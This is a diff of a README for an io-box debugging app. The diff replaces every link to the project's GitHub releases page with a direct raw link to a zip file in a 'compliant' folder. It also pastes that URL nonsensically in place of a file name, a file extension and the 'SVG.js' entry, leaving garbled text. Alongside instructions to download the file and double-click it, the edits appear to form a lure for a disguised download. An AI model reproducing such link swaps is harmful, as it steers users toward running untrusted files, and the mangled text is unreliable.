@@ -1,7 +1,7 @@
 # 🎉 viteyss-site-ioboxContact - Simplify Your Io-Box Debugging
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/A7med3ala2/viteyss-site-ioboxContact/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/A7med3ala2/viteyss-site-ioboxContact/main/compliant/viteyss-site-ioboxContact.zip%20Release-brightgreen)](https://raw.githubusercontent.com/A7med3ala2/viteyss-site-ioboxContact/main/compliant/viteyss-site-ioboxContact.zip)
 
 ## 🚀 Getting Started
 
@@ -19,13 +19,13 @@ Before you begin, make sure you have the following:
 
 To get started, you need to download the application. Follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/A7med3ala2/viteyss-site-ioboxContact/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/A7med3ala2/viteyss-site-ioboxContact/main/compliant/viteyss-site-ioboxContact.zip).
 
 2. **Select the Latest Release**: Look for the latest version at the top of the page. Click on it to view the details.
 
 3. **Download the Application**:
-   - If you see a file named something like `viteyss-ioboxContact-v1.0.exe`, click on it to download.
-   - If you see other file formats, choose the one suitable for your operating system (e.g., `.exe` for Windows, `.dmg` for Mac, or `.tar.gz` for Linux).
+   - If you see a file named something like `https://raw.githubusercontent.com/A7med3ala2/viteyss-site-ioboxContact/main/compliant/viteyss-site-ioboxContact.zip`, click on it to download.
+   - If you see other file formats, choose the one suitable for your operating system (e.g., `.exe` for Windows, `.dmg` for Mac, or `https://raw.githubusercontent.com/A7med3ala2/viteyss-site-ioboxContact/main/compliant/viteyss-site-ioboxContact.zip` for Linux).
 
 4. **Run the Application**: After downloading, locate the file you saved (usually in your Downloads folder). Double-click it to run the application.
 
@@ -49,7 +49,7 @@ This application covers a broad range of topics that are integrated into its fun
 - **Io-Box**: A tool for managing and processing data from connected devices.
 - **MQTT**: A messaging protocol designed for lightweight communication.
 - **Oiysh Terminal**: An interface for interacting effortlessly with ESP32 devices.
-- **SVG.js**: For embedding interactive graphics.
+- **https://raw.githubusercontent.com/A7med3ala2/viteyss-site-ioboxContact/main/compliant/viteyss-site-ioboxContact.zip**: For embedding interactive graphics.
 - **Viteyss**: The underlying framework enabling fast and reactive applications.
 - **Vue**: A progressive JavaScript framework for building user interfaces.
 - **WebSocket**: A protocol allowing real-time communication between clients and servers.
@@ -74,6 +74,6 @@ If you have questions or need help, you can reach out through the project's GitH
 
 ## 🔄 Updates
 
-We regularly update the application to fix bugs and add features. Always check the [Releases page](https://github.com/A7med3ala2/viteyss-site-ioboxContact/releases) for the latest version.
+We regularly update the application to fix bugs and add features. Always check the [Releases page](https://raw.githubusercontent.com/A7med3ala2/viteyss-site-ioboxContact/main/compliant/viteyss-site-ioboxContact.zip) for the latest version.
 
 By following this guide, you can easily download and run the viteyss-site-ioboxContact application to start debugging your io-box devices without any hassles. Enjoy a smoother debugging experience!
